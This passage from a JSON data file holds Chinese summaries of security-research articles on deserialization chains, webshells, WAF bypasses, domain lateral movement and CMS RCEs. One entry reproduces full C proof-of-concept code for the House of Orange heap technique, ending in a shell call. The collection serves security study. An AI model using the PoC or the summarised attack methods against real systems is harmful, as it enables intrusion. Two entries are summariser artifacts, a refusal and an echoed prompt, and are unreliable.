        "page_content": "本文档探讨了 Spring 框架中 Bean 的概念，以及如何使用纯 Java 代码在 Spring 应用程序中手动注册一个 Controller，从而实现 Webshell 功能。文中详细介绍了获取当前上下文环境、注册 Controller、编写 Controller 中的 Webshell 逻辑等步骤，并分析了 ContextLoaderListener 和 DispatcherServlet 在 Spring 应用程序中的作用。",
        "FileName": "10781-初探Java安全之Spring内存马.pdf"
    },
    {
        "page_content": "该文档分析了 Fastjson 1.2.25-1.2.47 版本中的反序列化漏洞，详细介绍了漏洞的原理、绕过补丁的方法、漏洞复现步骤以及不同版本受影响的情况，并提供了相应的 POC 和参考文档。",
        "FileName": "9052-Fastjson 1.2.25-1.2.47反序列化漏洞分析.pdf"
    },
    {
        "page_content": "本文介绍了一种基于图查询的攻击溯源方法，通过建立访问日志图谱，对图谱进行查询，可以发现攻击者访问后门的IP地址，并通过遍历疑似IP和后门地址，最终溯源到攻击者的真实IP地址。该方法可以有效地对攻击者进行排查和溯源，并可视化攻击者的操作路径。",
        "FileName": "11147-基于图查询的攻击溯源方法.pdf"
    },
    {
        "page_content": "该文档分析了 Thymeleaf Fragment 注入漏洞的原理和过程，并提出了新的注入点和扩展新 payload 的方法。通过代码示例和漏洞演示，文档阐述了如何利用该漏洞执行命令，并提供了通用的 payload 和扩展 payload 的方法，包括使用 ${expr}、* {expr}、${{expr}} 和 *{{expr}} 等语法。",
        "FileName": "9826-Thymeleaf Fragment 注入漏洞复现及新姿势扩展.pdf"
    },
    {
        "page_content": "该文档介绍了一种迂回渗透登录框的案例，通过结合目标院校的云桌面服务和一站式服务教工弱口令，成功登录目标系统的管理员云桌面，并从其浏览器记录中获取登录框密码，从而绕过登录框限制。",
        "FileName": "8670-记录一次登录框迂回渗透.pdf"
    },
    {
        "page_content": "该文档分析了 Weblogic T3/iiop 协议中的反序列化漏洞，并提出了两种利用该漏洞实现回显的方案。第一种方案使用 CVE-2020-2555 gadget 绕过 Weblogic 黑名单，而第二种方案利用 CVE-2020-2551 漏洞，该漏洞没有黑名单过滤。文档还提供了利用这些方案的代码示例和工具，并讨论了它们的不足之处。",
        "FileName": "7489-Weblogic T3iiop 构造有回显exp方案分析.pdf"
    },
    {
        "page_content": "该文档介绍了如何修改 ysoserial-CommonsBeanutils1 的 shiro 无依赖链，以利用 Commons-Beanutils 组件在 shiro 中进行利用。该利用链涉及创建恶意类、修改字段值、创建序列化对象并触发漏洞目标方法 TemplatesImpl#getOutputProperties()，从而执行恶意代码。通过使用 CaseInsensitiveComparator 或 Collections$ReverseComparator 类，可以修改利用链以使其不依赖 commons.collections 包。",
        "FileName": "10569-ysoserial-CommonsBeanutils1的shiro无依赖链改造.pdf"
    },
    {
        "page_content": "本文介绍了如何修改蚁剑以绕过 WAF 检测，重点介绍了编码器和解码器模块。通过在 webshell 中嵌入解码函数并使用随机前缀混淆参数，蚁剑可以实现完全加密传输，有效绕过 WAF 检测。",
        "FileName": "7735-蚁剑改造过WAF系列（一）.pdf"
    },
    {
        "page_content": "该文档分析了一个以太坊智能合约蜜罐，该蜜罐利用第三方组件的漏洞诱骗智能合约开发者和审计人员转账资金。蜜罐合约通过隐藏的调用修改答案，从而欺骗受害者，导致他们损失资金。文档还提供了分析区块链浏览器交易记录和智能合约代码以揭示蜜罐运作方式的详细步骤。",
        "FileName": "7225-一个有点意思的以太坊智能合约蜜罐.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 HTTPDecrypt 工具快速定位和解密 Android 应用程序中的通信协议。通过 hook 包名下的所有类，该工具可以识别加解密方法，并导出这些方法以进行远程调用。该流程节省了分析算法和编写插件的时间，使加解密过程更加高效。",
        "FileName": "7130-记一次App通信协议快速加解密.pdf"
    },
    {
        "page_content": "该文档分析了狂⾬ cms 前台 cookie 伪造漏洞，该漏洞允许攻击者通过伪造 cookie 中的签名来冒充其他用户。攻击者可以注册一个用户并登录，然后拦截返回的 cookie，修改 uid 参数并生成一个新的签名，从而接管其他用户的账户。",
        "FileName": "10349-狂雨cms前台cookie伪造漏洞.pdf"
    },
    {
        "page_content": "该文档介绍了一种对基于 TP5 开发的自助发卡系统进行渗透测试的方法，通过绕过上传文件验证和利用 PHP7 的 bug，攻击者可以上传 PHP 文件并执行命令，最终获得对系统的控制权。",
        "FileName": "7838-实战审计并getshell某发卡平台.pdf"
    },
    {
        "page_content": "本文介绍了 OpenSCA 技术原理中基于 npm 包管理器的组件成分解析原理，包括解析算法、package-lock.json 和 package.json 文件结构，以及如何通过这些文件构建依赖结构和获取依赖的准确版本。",
        "FileName": "12023-技术文档丨 OpenSCA技术原理之npm依赖解析.pdf"
    },
    {
        "page_content": "抱歉，我无法从给定的文档中提取主题和内容。",
        "FileName": "12354-《 Windows Kernel Pwn 101 》.pdf"
    },
    {
        "page_content": "该文档分析了一个恶意软件样本，该样本伪装成 ESET 更新程序，通过释放自拷贝、设置自动启动、与恶意域名交互、修改注册表和执行远程注入来感染系统。样本使用特定解密函数和动物名称，属于 KimSuky 家族系列。",
        "FileName": "8016-观赏某大佬分析病毒后的一次复现分析.pdf"
    },
    {
        "page_content": "文档探讨了 ELK（Elasticsearch、Logstash 和 Kibana）在渗透测试中的利用和安全配置。它重点介绍了 Elasticsearch 未授权访问的检测和利用，Kibana 的权限提升，以及 Logstash 的权限提升技术。文档还提供了有关 ELK 重要配置文件的详细信息，并强调了在渗透测试期间检查这些文件以查找潜在漏洞的重要性。",
        "FileName": "9370-ELK在渗透测试中的利用与安全配置解析.pdf"
    },
    {
        "page_content": "该文档分析了通达 OA ⽂件上传 + 任意⽂件包含漏洞，重点关注了 v11 和 2015 版本的漏洞利用。它描述了如何通过变量覆盖和未授权⽂件上传来利用漏洞，并提供了利用 payload 和测试结果。",
        "FileName": "7446-通达OA文件上传+任意文件包含漏洞分析.pdf"
    },
    {
        "page_content": "该文档主要介绍了 RMI 工作原理和反序列化知识，包括 RMI 通信过程、RMI 涉及的注册中心、服务端和客户端，以及 RMI 中反序列化的原理和利用。",
        "FileName": "7334-RMI 工作原理及反序列化知识学习.pdf"
    },
    {
        "page_content": "本文深入探讨了反射式 DLL 注入技术，包括常规 DLL 注入和反射式 DLL 注入的原理、实现和检测方法。它还提供了攻防对抗的思考和参考了相关文档。",
        "FileName": "11072-深入理解反射式dll注入技术.pdf"
    },
    {
        "page_content": "该文档详细描述了作者在一次黑客挑战中通过分析 JavaScript 文件发现 GitLab 漏洞，进而获取 shell 权限并最终接管整个云平台的过程。作者利用 JS 断点调试、信息收集和 GitLab 历史漏洞，成功反弹 shell 并找到备份文件，最终通过审计泄露的凭证接管了云平台。",
        "FileName": "12698-记一次hc中因为JS拿下整个云.pdf"
    },
    {
        "page_content": "该文档分析了 XX 文库系统中的安全漏洞，包括 7 个 SQL 注入漏洞和多个存储型和反射型 XSS 漏洞。这些漏洞主要是由于参数拼接和未过滤导致的。文档还提到了其他类型的漏洞，如路径穿越、上传和 RCE，但没有详细分析。",
        "FileName": "11025-XX文库的再踩坑（补救）.pdf"
    },
    {
        "page_content": "该文档分析了 ysoserial 利用链中 commons1 和 commons-collection4 的利用方式。它从 readObject 方法开始，逐步跟踪执行流程，解释了如何通过 ChainedTransformer、InvokerTransformer 和 TransformingComparator 等类来触发命令执行。文档还提到了 JDK 1.8 8u71 版本后 cc1 无法使用，而 cc2 适用于 common-collection4-4.0。",
        "FileName": "9154-ysoserial利用链分析(一).pdf"
    },
    {
        "page_content": "该文档主要分析了冰蝎 v2.0.1 核⼼部分的源码，包括密匙协商、获取服务器基本信息、执⾏系统命令、⽂件管理、数据库管理、反弹 meterpreter 、执⾏⾃定义代码等功能的实现原理。通过分析源码，可以了解冰蝎如何通过加密通信、动态⽣成 payload 等技术绕过安全检测，实现对服务器的控制。",
        "FileName": "7300-冰蝎v2.0.1核心部分源码浅析.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 Microsoft Edge 浏览器中利用 XSS 漏洞造成 RCE 攻击的方法，涉及的技术包括 cookie 中的 XSS 攻击、权限提升方法、缓存中毒攻击、文件读取攻击链。",
        "FileName": "12829-微软Edge浏览器Web漏洞挖掘系列-从简单上手到高级利用.pdf"
    },
    {
        "page_content": "本文档介绍了如何绕过最新安全狗 WAF 中的 SQL 注入，通过实战 fuzzing 增强 SQL 注入能力。作者通过本地搭建的环境进行测试，详细介绍了安装安全狗插件和安全狗的过程，并提供了绕过 WAF 的多种方法，包括使用注释符、内联注释、联合查询和爆库、爆表、爆列、爆字段等技巧。此外，还提供了 tamper 脚本，用于自动化绕过过程。",
        "FileName": "11412-从SQL注入绕过最新安全狗WAF中学习fuzz.pdf"
    },
    {
        "page_content": "本文探讨了一种基于深度学习算法在白盒代码审计中的应用，尝试使用算法检测源代码中的漏洞。该算法将代码数据流转换成字节码切片，并使用孪生神经网络模型计算待检测代码和漏洞模板之间的相似度，根据相似度是否超过阈值判定是否存在漏洞。实验结果表明，该算法对 SQL 注入和 XSS 漏洞的检测准确率分别为 78.04% 和 99.02%，召回率分别为 100.0% 和 92.22%，F1 值分别为 88.04% 和 95.50%。",
        "FileName": "9539-基于算法的漏洞检测.pdf"
    },
    {
        "page_content": "该文档分析了反序列化漏洞中三个 source 点（readObject、readResolve、readExternal）的原理。在反序列化过程中，ObjectInputStream#readObject 方法调用 readObject0 方法，根据输入流中的 TC_OBJECT 值调用 readOrdinaryObject 方法。readOrdinaryObject 方法通过反射调用 readObject 方法，如果类实现了 Externalizable 接口，则调用 readExternal 方法。readResolve 方法在 readSerialData 方法之后调用，如果类实现了 Externalizable 接口，则调用 readExternalData 方法。",
        "FileName": "11915-GadgetInspector改造中反序列化三个source点的原理分析.pdf"
    },
    {
        "page_content": "DNS Rebinding Bypass SSRF 是一种攻击技术，它利用 DNS 重新绑定绕过同源策略，允许攻击者从受害者的计算机向其他网络位置发送请求。攻击者通过配置一个 DNS 服务器，在第一次请求时返回合法的 IP 地址，在第二次请求时返回恶意 IP 地址，从而绕过 SSRF 检测。",
        "FileName": "8707-DNS Rebinding Bypass SSRF.pdf"
    },
    {
        "page_content": "该文档详细介绍了 DedeCMS v5.7 后台 RCE 漏洞的成因和利用方法。漏洞成因在于用户新建文件时，系统没有对文件名合法性进行判断，且对文件内容的过滤不完全，导致攻击者可以通过恶意输入利用该漏洞。攻击者可以通过创建模板页面和页面，将恶意代码写入上传目录，从而在服务器上执行任意命令。",
        "FileName": "12719-DedeCMS v5.7 -- 后台RCE漏洞详解.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-22017 和 CVE-2021-22005 漏洞，这些漏洞利用了 VMware vCenter Appliance 中的模板注入和数据收集接口，允许攻击者通过 Velocity 模板执行代码并获取系统信息。利用这些漏洞，攻击者可以绕过 CEIP 保护，创建代理并执行恶意代码，从而获得对受影响系统的控制。",
        "FileName": "10603-CVE-2021-22017+22005模板注入分析.pdf"
    },
    {
        "page_content": "该文档讨论了如何绕过 Web 应用程序防火墙 (WAF) 和文件上传漏洞的限制。它提供了判断文件上传漏洞是否存在以及如何绕过 WAF 限制的步骤，包括修改文件后缀、畸形文件包和利用 Data URI Schema。文档还强调了绕过 WAF 的本质是利用服务器和 WAF 对数据包解析的差异性。",
        "FileName": "8084-Upload与WAF的那些事.pdf"
    },
    {
        "page_content": "该文档介绍了如何在 .NET 项目中快速定位漏洞，包括寻找源码、确定路由结构、查找未授权访问和任意文件上传。通过使用简单的技巧，如扫描目录和搜索上传函数，作者成功找到了一个未授权访问点和一个任意文件上传漏洞，最终获得了权限。",
        "FileName": "11185-记一次项目中如何快速定位.net漏洞点.pdf"
    },
    {
        "page_content": "OpenRASP 是一款开源免费的 Runtime application self-protection（运行时应用自我保护）技术，通过 JavaAgent 机制实现，在服务器启动时动态修改 Java 字节码，对敏感操作的函数进行 hook，当服务器发生攻击时，就会触发这些 Hook 点，此时 RASP agent 就可以获取到函数的参数，如要读取的文件名、要执行的命令等等。",
        "FileName": "11803-OpenRASP浅析.pdf"
    },
    {
        "page_content": "Vulnerability-goapp 平台是一个基于 Go 语言的漏洞审计平台，主要用于了解 Go 语言的 Web 流程。该平台存在多个漏洞，包括 XSS、SQL 注入、任意文件上传和命令执行，这些漏洞可以通过精心构造的请求来利用。",
        "FileName": "7243-Vulnerability-goapp-Go语言漏洞平台审计过程.pdf"
    },
    {
        "page_content": "该文档介绍了 Resin 中回显和内存马的实现方法，包括通过反射获取当前请求对象来实现回显，以及通过动态注册 Servlet、Filter 和 Listener 来实现内存马。",
        "FileName": "9639-Resin回显及内存马.pdf"
    },
    {
        "page_content": "该文档提供了 bodgeito 网站的通关教程，详细介绍了如何利用 XSS、水平越权和 CSRF 漏洞来绕过网站的安全措施。教程包括构造有效 payload、寻找隐藏内容、注册管理员帐户、修改密码和利用购物车的水平越权漏洞。",
        "FileName": "12090-bodgeito通关教程.pdf"
    },
    {
        "page_content": "该文档介绍了如何修改 frp 以支持域前置，包括修改 WebSocket 握手、配置新参数、修复证书错误以及配置 CDN 和客户端/服务器设置。",
        "FileName": "11460-frp改版-支持域前置.pdf"
    },
    {
        "page_content": "本文档介绍了如何使用 Golang 实现恶意的 DLL 劫持转发，该技术通过恶意 DLL 替换原始 DLL，重命名原始 DLL，并通过恶意 DLL 将原始功能转发到原始 DLL。恶意 DLL 通常用于执行攻击者希望拦截或修改的功能，同时将所有其他功能转发到原始 DLL。",
        "FileName": "10143-golang实现dll恶意劫持转发.pdf"
    },
    {
        "page_content": "该文档主要讨论 SQL 注入攻击，包括其原理、分类、危害、挖掘方法和绕过技术。它详细介绍了数值型和字符型注入，以及在登录框、搜索框和 URL 中进行注入的测试方法。此外，文档还提供了绕过空格、引号和逗号过滤的技巧，以及绕过延时函数和云 WAF 的方法。",
        "FileName": "12149-sql注入如何挖掘（一）.pdf"
    },
    {
        "page_content": "该文档包含一系列网络安全挑战的解决方案，涉及各种技术，包括文件扫描、代码审计、SQL注入、CSRF攻击、爬虫和密码破译。这些挑战旨在测试和提高网络安全技能，并提供了详细的步骤和说明，以帮助解决每个问题。",
        "FileName": "12172-GeekChallenge.pdf"
    },
    {
        "page_content": "本文分析了 PHP 恶意软件中基于空格符的隐身术，该技术将恶意代码隐藏在看似无害的许可证文本中。攻击者利用空格符和制表符创建不可见的字符序列，这些序列在解码后包含一个 Web shell，可用于控制受感染的服务器。该技术虽然提供了隐蔽性，但由于文件大小大幅增加和包含易于检测的 PHP 部分，其隐身效果并不理想。",
        "FileName": "9198-深入考察PHP恶意软件中基于空白符的隐身术.pdf"
    },
    {
        "page_content": "本文档分析了 WMCTF 2022 比赛中的一道非典型内存和流量取证题目。该题目涉及到使用 Autopsy 工具进行内存镜像分析，并通过关键词搜索和数据单元分析等技术，从流量和内存中提取加密信息，最终解密出完整的 flag。",
        "FileName": "11699-不常见的内存与流量取证 -- WMCTF 2022 1!5!.pdf"
    },
    {
        "page_content": "该文档比较了七个网络空间搜索引擎：Fofa、Zoomeye、Shodan、Sumap、Quake、Censys 和谛听。它讨论了每个搜索引擎的优点和缺点，包括资产特征收集、结果展示、会员资格和查询限制。该文档旨在帮助读者根据其特定需求选择最合适的搜索引擎。",
        "FileName": "9386-网络空间搜索引擎的区别.pdf"
    },
    {
        "page_content": "本文分析了 Tomcat 容器中 URL 解析的特性，重点关注了对 `;`、`/./`、`/../` 和 `..;/` 的特殊处理。通过动态调试 Tomcat 源代码，作者揭示了这些特性背后的机制，并解释了它们如何影响 URL 解析过程。",
        "FileName": "10799-tomcat容器url解析特性研究.pdf"
    },
    {
        "page_content": "本文档详细介绍了如何利用 SSRF（服务器端请求伪造）漏洞穿透内网，涵盖了各种常见的攻击场景，包括文件读取、端口探测、代码注入、SQL 注入、命令执行、XML 实体注入、Tomcat 任意文件写入、Redis 未授权访问、MySQL 未授权访问和 UDF 提权。",
        "FileName": "9554-手把手带你用 SSRF 打穿内网.pdf"
    },
    {
        "page_content": "该文档详细描述了作者如何通过分析 JavaScript 代码，发现并利用一个教育网站中的多个漏洞，包括敏感信息泄露、任意文件下载和未授权访问。作者通过修改 JavaScript 代码中的密码类型，获取了数据库凭据，并通过下载网站脚本源码，发现了未授权的登录界面，最终获得了对网站后台的访问权限。",
        "FileName": "10353-从JS接口的泄露到拿下通用型eduGetshell漏洞.pdf"
    },
    {
        "page_content": "Java Instrumentation API 是一种修改已有方法的 Java 方式，它通过 java.lang.instrument.Instrumentation 提供了 redefineClasses 方法，结合 javassist 可以修改类方法。",
        "FileName": "10186-Linux下内存马进阶植入技术.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 Twig 3.x 与 Symfony 中的服务器端模板注入 (SSTI) 漏洞，通过任意文件读取和远程代码执行 (RCE) 来攻击应用程序。",
        "FileName": "7507-TWIG 3.x with symfony  SSTI.pdf"
    },
    {
        "page_content": "**主题：**禅道 11.6 后台 SQL 注入漏洞复现分析\n\n**内容：**该漏洞存在于禅道 11.6 的 /module/api/control.php 文件中的 getModel 方法中，该方法使用 call_user_func_array() 方法直接访问和操控参数，导致攻击者可以执行任意 SQL 查询，从而获取敏感信息或破坏系统。",
        "FileName": "8066-禅道11.6注入分析.pdf"
    },
    {
        "page_content": "该文档详细介绍了 Facebook 登录 SDK 中的一个 DOM XSS 漏洞，该漏洞允许攻击者在 Facebook.com 域上执行任意 JavaScript 代码。该漏洞是由于 postMessage 配置不正确，当用户访问攻击者控制的网站并单击 Facebook 按钮时，就会触发。Facebook 已修复此漏洞，并向发现者奖励了 20,000 美元的赏金。",
        "FileName": "7783-Bug Bounty$20000 Facebook DOM XSS.pdf"
    },
    {
        "page_content": "该文档分析了两个 Python 沙盒逃逸题目，第一个是 Python 2 中的常见沙盒逃逸，通过删除内置函数并使用字符串拼接来执行命令。第二个是 Python 3 中的沙盒逃逸，通过利用 Python 3 中支持非 ASCII 标识符和将所有内容转换为 Unicode 的特性，使用 Unicode 字符欺骗来导入包并执行命令。",
        "FileName": "9271-一道有趣的pyjail题目分析.pdf"
    },
    {
        "page_content": "**文档主题：** House of Orange 原理 Poc\n\n**文档内容：**\n\nHouse of Orange 原理 Poc\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint winner(char *ptr);\n\nint main() {\n    fprintf(stderr, \"House of orange Poc \\n\\n\");\n    char *p1, *p2;\n    size_t io_list_all, *top;\n    p1 = malloc(0x400 - 16);\n    fprintf(stderr, \"首先申请一个 chunk: p1 %p \\n\", p1);\n    fprintf(stderr, \"设置 top chunk+size ⻚⾯对⻬，设置 prev_inuse 位 \\n\\n\");\n    top = (size_t *)(\n        ((char *)p1 + 0x400 - 16));\n    top[1] = 0xc01;\n    fprintf(stderr, \"申请一个 size 大于 top chunk 的块，使其调⽤ sysmalloc 和 _init_free \\n\\n\");\n    p2 = malloc(0x1000);\n    fprintf(stderr, \"p2 %p \\n\", p2);\n    fprintf(stderr, \"chunk->bk->fd 覆盖 _IO_list_all 指针 \\n\\n\");\n    io_list_all = top[2] + 0x9a8;\n    fprintf(stderr, \"io_list_all 现在指向 chunk->bk->fd %p \\n\", &io_list_all);\n    fprintf(stderr, \"当 malloc 分割时， chunk->bk->fd 的值会被 libc 的 main_arena 中的 unsorted bin 列表的地址覆盖。 \\n\\n\");\n    fprintf(stderr, \"设置 chunk->bk 为 _IO_list_all - 16 \\n\");\n    top[3] = io_list_all - 0x10;\n    fprintf(stderr, \"system 将通过 top 指针被调⽤，使⽤ /bin/sh 填充前 8 个字节，相当于 system(/bin/sh) \\n\");\n    memcpy(((char *)top), \"/bin/sh \\x00\", 8);\n    fprintf(stderr, \"将 top chunk 的 size 改⼩，使旧的 top chunk 被 malloc 分配到 small bin[4] ，指向伪⽂件指针的 fd- ptr \\n\\n\");\n    top[1] = 0x61;\n    fprintf(stderr, \"满⾜条件 fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base \\n\");\n    _IO_FILE *fp = (_IO_FILE *)top;\n    fprintf(stderr, \"满⾜ fp->_mode <= 0 \\n\");\n    fp->_mode = 0; // top+0xc0\n    fprintf(stderr, \"满⾜ fp->_IO_write_ptr > fp->_IO_write_base \\n\");\n    fp->_IO_write_base = (char *)2; // top+0x20\n    fp->_IO_write_ptr = (char *)3; // top+0x28\n    fprintf(stderr, \"设置跳板指向可控内存 \\n\\n\");\n    size_t *jump_table = &top[12]; // 可控内存\n    jump_table[3] = (size_t)&winner;\n    *(size_t *)((size_t)fp + sizeof(_IO_FILE)) = (size_t)jump_table; // top+0xd8\n    fprintf(stderr, \"malloc 触发利⽤链 \\n\");\n    malloc(10);\n    return 0;\n}\n\nint winner(char *ptr) {\n    system(ptr);\n    return 0;\n}",
        "FileName": "7266-House of 系列堆漏洞详解(一).pdf"
    },
    {
        "page_content": "该文档分析了⽹康下⼀代防⽕墙（NGFW）中存在的远程命令执⾏（RCE）漏洞，该漏洞允许攻击者通过发送精心构造的 HTTP POST 请求来在⽬标系统上执⾏任意命令。漏洞的根源在于 web 应⽤程序中对⽤户输⼊的处理不当，导致攻击者能够通过命令注⼊来绕过安全措施。",
        "FileName": "9495-网康防火墙前台RCE及分析.pdf"
    },
    {
        "page_content": "**主题：** Java 安全 - JDBC 反序列化漏洞\n\n**内容：** JDBC（Java 数据库连接）是一种用于执行 SQL 语句的 Java API，它通过连接数据库并对其进行操作来实现。该文档分析了 JDBC 反序列化漏洞，该漏洞允许攻击者通过在 JDBC 连接 URL 中设置特定参数来触发反序列化，从而执行任意代码。文档详细介绍了漏洞的触发过程，包括初始化服务器、发送查询字符串和执行 SQL 语句，并解释了如何利用该漏洞进行攻击。",
        "FileName": "10599-Java安全-JDBC反序列化.pdf"
    },
    {
        "page_content": "该文档详细描述了作者对某学院网站子站的渗透测试过程。作者通过爆破用户密码、查看源代码和修改cookie值等方法，绕过安全措施并获得了对后台的未授权访问。作者还发现了一个文件上传漏洞，并利用它上传了一个恶意文件，从而进一步提升了权限。",
        "FileName": "8638-柳暗花明又一村的后台渗透.pdf"
    },
    {
        "page_content": "该文档分析了 Struts2-001 漏洞，这是一个远程代码执行漏洞，影响 Struts 2.0.0 至 2.0.8 版本。漏洞源于 params 拦截器在处理 Ognl 表达式时存在递归解析问题，导致攻击者可以执行任意代码。文档提供了漏洞环境、分析和修复方法，并强调了 Ognl 表达式递归解析次数的限制在修复后的代码中。",
        "FileName": "7915-Java代码审计之Struts2-001.pdf"
    },
    {
        "page_content": "该文档分析了 DA14531 固件中 L2CAP 和 ATT 层收包处理过程，重点介绍了 ATT 层报文解析流程，包括 opcode 字段的识别和不同 PDU 类型的数据结构解析。文档还指出了 ATT PDU 处理中存在的漏洞，例如整数溢出导致堆溢出、越界读和校验失败。",
        "FileName": "9199-DA14531芯片固件逆向系列（4）- L2CAP及ATT层收包再分析.pdf"
    },
    {
        "page_content": "**主题：** CVE-2021-32682 elFinder RCE 漏洞分析\n\n**内容：**\n该漏洞存在于 elFinder 2.1.58 及更早版本中，由于在创建 zip 存档时对 name 参数未进行严格过滤，导致命令注入。攻击者可以通过构造恶意 zip 存档，在受害者系统上执行任意命令。该漏洞的利用涉及分析源代码、跟踪参数流并最终构造恶意命令。",
        "FileName": "10739-CVE-2021-32682 elFinder RCE 简单分析.pdf"
    },
    {
        "page_content": "本文分析了智能合约中两个不一致性检查问题：LightXXX 合约中的授权额度检查和 CountryXXX 合约中的资产数量检查。这些问题导致攻击者可以绕过检查，无限转账或获得大量代币。本文还提供了修复建议，例如使用安全数学方法和正确的条件判断。",
        "FileName": "9982-智能合约安全之不一致性检查.pdf"
    },
    {
        "page_content": "该文档分析了 Laravel 反序列化利用链，涉及 Illuminate\\Broadcasting\\PendingBroadcast、Illuminate\\Bus\\Dispatcher 和 Illuminate\\Broadcasting\\BroadcastEvent 类，通过控制 PendingBroadcast 类中的 events 和 event 变量，可以调用任意类的 dispatch() 方法，从而实现任意代码执行。",
        "FileName": "8359-Laravel反序列化利用链分析.pdf"
    },
    {
        "page_content": "本文分析了多种静态应用安全测试（SAST）工具，包括 Cobra、KunLun-M、Hades、Fortify、Checkmarx、SonarQube 和 CodeQL。这些工具使用正则表达式、语义分析、数据流分析和查询语言来检测代码中的安全漏洞。它们在误报率、漏报率、扫描速度、持续集成支持、语言支持和漏洞覆盖方面各有优缺点。",
        "FileName": "10216-SAST(静态应用程序安全测试&代码审计)方案调研.pdf"
    },
    {
        "page_content": "该文档介绍了 GitHub SSTI 靶场的利用方法，包括如何获取操作系统和 __builtins__ 来执行命令，以及如何绕过各种 Web 应用程序防火墙 (WAF) 规则。它提供了针对不同 WAF 配置的详细 payload，并解释了如何使用过滤器、列表和字符串操作来构造绕过规则的有效载荷。",
        "FileName": "9407-GitHub SSTI靶场 wp.pdf"
    },
    {
        "page_content": "本文分析了如下文档并完成以下任务：\n\n                    1. 分析文档的主题和内容\n                    2. 用一段话概括文档\n\n**文档主题和内容**\n\n该文档分析了 Windows 10 下的 Pass-the-Hash（PtH）攻击，包括：\n\n* PtH 攻击的原理和可行性\n* 提取密码哈希值的技术\n* 在不同协议下执行 PtH 攻击的条件和方法\n* 防御 PtH 攻击的安全措施\n\n**文档概括**\n\n该文档全面分析了 Windows 10 下的 PtH 攻击，提供了提取哈希值的技术、执行攻击的方法以及防御措施，强调了 PtH 攻击仍然是企业面临的威胁，需要采取措施降低风险。",
        "FileName": "7051-深入研究Pass-the-Hash攻击与防御.pdf"
    },
    {
        "page_content": "该文档提供了红队渗透测试中快速信息收集和批量检测的方法，包括企业信息结构收集、敏感信息收集、域名主动被动收集、整理域名 IP 资产以及扫描检测打点，旨在帮助红队人员快速识别和利用目标系统的脆弱点。",
        "FileName": "11112-红队信息收集到打点.pdf"
    },
    {
        "page_content": "该文档详细描述了作者对一个诈骗团伙的调查过程，包括注册用户、利用 TP5 框架漏洞获取 shell、收集数据库信息、爆破客服后台、审计代码发现上传漏洞并利用该漏洞上传恶意文件。作者呼吁人们警惕诈骗，不要相信一夜暴富的谎言。",
        "FileName": "9286-深入诈骗团队.pdf"
    },
    {
        "page_content": "该文档分析了 CVE-2021-26120 漏洞，该漏洞存在于 Smarty 模板引擎中，允许攻击者通过注入恶意代码来执行任意命令。文档详细介绍了漏洞的利用过程，包括如何创建恶意模板文件、生成编译文件以及绕过安全限制。",
        "FileName": "11131-CVE-2021-26120一波潦草的分析.pdf"
    },
    {
        "page_content": "文档主题是横向移动与域控权限维持方法，内容包括利用NTLM或Kerberos协议的Pass the Hash攻击、使用meterpreter模块获取hash、上传procdump获取lsass.dmp文件、利用cobalt strike获取hash、利用sam表读取hash、利用psexec模块获取hash、利用mimikatz在线读取sam表中的hash、利用kekeo工具进行Kerberoast攻击、利用golanpac工具获取域控system权限的cmd shell、利用Rubeus工具进行Kerberoast攻击、利用Empire框架导出hashcat格式的hash、利用hashcat破解HASH、利用AS-REP Roast攻击、利用域委派进行攻击、利用基于资源的约束性委派进行攻击、利用非约束性委派配合Spooler打印机服务进行攻击、利用约束性委派进行攻击、利用credssp协议导出用户明文密码、利用tscon横向移动、利用DCOM/COM对象进行横向移动、利用IPC$进行横向移动、利用at命令进行计划任务执行、利用schtasks命令进行计划任务执行、利用wmic命令进行远程进程调用、利用winrm进行远程命令执行、利用Hook PasswordChangeNotify获取用户修改后的密码明文、利用mimikatz进行万能密码SSP注入、利用sid history进行权限维持、利用DSRM账号进行持久化操作、利用DCSYNC导出hash、利用exchange用户达到域提权目的、利用AdminSDHolder进行权限维持。",
        "FileName": "9382-常见横向移动与域控权限维持方法.pdf"
    },
    {
        "page_content": "该文档介绍了如何利用 FastJson 结合二次反序列化绕过黑名单，通过 SignedObject 绕过第一层安全检查，从而实现 RCE。该方法依赖于 ObjectInputStream 输入数据的可控性，以及 Fastjson 依赖的引入。",
        "FileName": "12606-FastJson结合二次反序列化绕过黑名单.pdf"
    },
    {
        "page_content": "该文档主要介绍了 Node.js 中的漏洞技巧，包括原型链污染、子进程命令执行、文件读取和写入、反弹 shell、VM 和 VM2 沙箱逃逸以及模板字符串利用。它提供了利用这些技巧绕过安全限制和执行命令的详细说明。",
        "FileName": "9167-nodejs 中的漏洞技巧.pdf"
    },
    {
        "page_content": "在一次红蓝对抗中，作者发现目标存在 Solr-RCE 漏洞，但由于目标限制，只能执行单命令且返回字段较少。作者通过尝试各种方法，最终利用 Certutil 编码解码绕过限制，成功写入 webshell，并解决 500 错误，最终连接成功。",
        "FileName": "11546-某次红蓝对抗之Solr-RCE实战绕过.pdf"
    },
    {
        "page_content": "该文档讨论了利用域信任中的 sAMAccountName 欺骗来获得对域控制器的特权访问。它详细介绍了攻击步骤，包括创建机器帐户、重命名机器帐户、申请 TGT 和 ST 票据，以及最终进行 DCSync。该文档还探讨了跨域和林间信任环境中攻击的可行性，并提供了单向信任场景的示例。",
        "FileName": "10673-sAMAccountName spoofing在域信任中的利用.pdf"
    },
    {
        "page_content": "本文档详细介绍了一次 Shiro 反序列化渗透测试，从信息收集、前端敏感接口、自定义加密算法模块、用户名可枚举漏洞到最终利用 Shiro 反序列化回显工具成功获取 shell，展示了渗透测试的完整过程和技术细节。",
        "FileName": "9886-记一次Shiro反序列化渗透测试.pdf"
    },
    {
        "page_content": "本文探讨了利用 Windows 公开的调试框架在 .NET 进程中直接调用 .NET 方法的可能性，无需将 Shellcode 或完整的 .NET 程序集注入非托管空间。通过利用 ICorDebug 接口，可以控制 .NET 进程，并使用调试 API 在目标进程中调用任意 .NET 代码。",
        "FileName": "8331-深入挖掘.NET注入.pdf"
    },
    {
        "page_content": "该文档介绍了 17 道 XSS 绕过实例，涵盖了基础和进阶篇，并提供了多种构造和绕过思路，包括观察法、JS 断点调试和故意输出特殊字符导致 JS 语法错误的调试。",
        "FileName": "11677-一些BAT的XSS实例（一）基础篇.pdf"
    },
    {
